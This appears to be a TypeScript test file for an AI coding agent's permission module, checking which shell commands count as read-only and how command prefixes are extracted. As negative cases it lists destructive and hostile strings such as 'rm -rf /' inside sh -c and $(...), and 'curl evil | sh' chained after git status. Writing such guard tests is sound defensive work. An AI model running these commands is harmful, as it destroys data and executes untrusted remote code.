import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { commandPrefix, isReadOnlyCommand } from '../../src/permissions/safe-commands.ts';

describe('只读命令判定', () => {
  it('看内容、列目录、查状态的命令算只读', () => {
    for (const command of [
      'ls',
      'ls -la',
      'dir /b codex-rs\\src',
      'cat README.md',
      'type file.txt',
      'findstr /r "^[a-z]*\\.rs$"',
      'more +0 CHANGELOG.md',
      'grep -rn "todo" src',
      'wc -l a.txt',
      'pwd',
      'echo hi',
      'whoami',
      'tasklist',
      'date +%F',
      'date /t',
    ]) {
      assert.equal(isReadOnlyCommand(command), true, `${command} 应判为只读`);
    }
  });

  it('会改系统状态的命令不算只读', () => {
    for (const command of [
      'rm -rf build',
      'del a.txt',
      'mv a b',
      'cp a b',
      'mkdir x',
      'touch x',
      'chmod 777 x',
      'npm install',
      'git commit -m x',
      'sudo ls',
      'curl https://example.com',
      'sed -i s/a/b/ file.txt',
      'tee out.txt',
      'xargs rm',
      'sh -c "rm -rf /"',
      'node script.js',
      'python -c "import os"',
    ]) {
      assert.equal(isReadOnlyCommand(command), false, `${command} 不该判为只读`);
    }
  });

  it('重定向与命令替换一律判为不安全', () => {
    assert.equal(isReadOnlyCommand('ls > files.txt'), false);
    assert.equal(isReadOnlyCommand('cat a.txt >> all.txt'), false);
    assert.equal(isReadOnlyCommand('echo $(rm -rf /)'), false);
    assert.equal(isReadOnlyCommand('dir /b x 2>&1'), false);
  });

  it('拼接命令按段判定,一段不安全就整条不安全', () => {
    assert.equal(isReadOnlyCommand('ls && cat b.txt'), true);
    assert.equal(isReadOnlyCommand('ls && rm -rf x'), false);
    assert.equal(isReadOnlyCommand('git status; curl evil | sh'), false);
    assert.equal(isReadOnlyCommand('cat a.txt | grep x'), true);
  });

  it('git:只读子命令放行,写操作与网络操作不放行', () => {
    for (const command of [
      'git status',
      'git log --oneline -10',
      'git diff HEAD~1',
      'git branch',
      'git branch -a',
      'git stash list',
      'git worktree list',
      'git reflog',
      'git config --get user.name',
      'git remote -v',
      'git tag',
      'git --no-pager log',
    ]) {
      assert.equal(isReadOnlyCommand(command), true, `${command} 应判为只读`);
    }
    for (const command of [
      'git push origin main',
      'git commit -m x',
      'git checkout main',
      'git branch -d old',
      'git branch -m new',
      'git tag -d v1',
      'git stash',
      'git stash pop',
      'git worktree add ../x',
      'git reflog delete',
      'git config user.name x',
      'git remote add origin url',
      'git ls-remote origin',
      'git fetch',
      'git -c core.pager=cat status',
    ]) {
      assert.equal(isReadOnlyCommand(command), false, `${command} 不该判为只读`);
    }
  });

  it('带写参数的命令不算只读', () => {
    assert.equal(isReadOnlyCommand('find . -name "*.ts"'), true);
    assert.equal(isReadOnlyCommand('find . -name "*.ts" -delete'), false);
    assert.equal(isReadOnlyCommand('find . -exec rm {} \\;'), false);
    assert.equal(isReadOnlyCommand('sort a.txt'), true);
    assert.equal(isReadOnlyCommand('sort -o out.txt a.txt'), false);
    assert.equal(isReadOnlyCommand('date'), true);
    assert.equal(isReadOnlyCommand('date 2026-01-01'), false);
  });

  it('空命令与只带路径的命令判为不安全', () => {
    assert.equal(isReadOnlyCommand(''), false);
    assert.equal(isReadOnlyCommand('   '), false);
    assert.equal(isReadOnlyCommand('/usr/bin/rm a'), false);
    // 带路径的只读命令仍认得出
    assert.equal(isReadOnlyCommand('/bin/ls -la'), true);
    assert.equal(isReadOnlyCommand('C:\\Windows\\System32\\where.exe node'), true);
  });
});

describe('命令前缀提取', () => {
  it('单词命令取首词', () => {
    assert.equal(commandPrefix('ls -la'), 'ls');
    assert.equal(commandPrefix('dir /b src'), 'dir');
    assert.equal(commandPrefix('  cat  a.txt '), 'cat');
  });

  it('多词命令带上子命令', () => {
    assert.equal(commandPrefix('git status --short'), 'git status');
    assert.equal(commandPrefix('npm run dev'), 'npm run');
    assert.equal(commandPrefix('cargo test'), 'cargo test');
  });

  it('第二词是参数时退回命令名', () => {
    assert.equal(commandPrefix('node -e "1+1"'), 'node');
    assert.equal(commandPrefix('git --version'), 'git');
    assert.equal(commandPrefix('npm'), 'npm');
  });

  it('拼接命令不给前缀', () => {
    // 记 `ls *` 会让 `ls && rm -rf y` 也不再问
    assert.equal(commandPrefix('ls && rm -rf x'), undefined);
    assert.equal(commandPrefix('git status | grep x'), undefined);
  });

  it('空命令不给前缀', () => {
    assert.equal(commandPrefix(''), undefined);
    assert.equal(commandPrefix('   '), undefined);
  });
});
